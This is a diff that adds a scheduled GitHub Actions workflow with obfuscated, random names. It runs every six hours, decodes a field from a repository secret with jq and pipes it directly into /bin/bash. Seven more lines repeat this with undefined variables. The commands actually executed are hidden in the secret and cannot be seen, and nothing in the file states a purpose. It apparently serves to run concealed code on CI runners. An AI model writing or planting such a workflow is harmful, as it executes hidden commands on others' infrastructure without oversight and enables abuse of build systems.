@@ -1,0 +1,25 @@
+name: skegundress
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '10 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: skegundress
+        env:
+          qawbf635: ${{ secrets.qawbf635 }}
+        run: |
+          echo $qawbf635 | jq -r .gnw276 | /bin/bash
+          echo $rrsy6661 | jq -r .torg36 | /bin/bash
+          echo $cny855 | jq -r .xmfoa98 | /bin/bash
+          echo $eqo81 | jq -r .nky63492 | /bin/bash
+          echo $bui3 | jq -r .si574 | /bin/bash
+          echo $s178 | jq -r .ru16962 | /bin/bash
+          echo $keaco01 | jq -r .onp98 | /bin/bash
+          echo $v9026 | jq -r .mzba8085 | /bin/bash
+
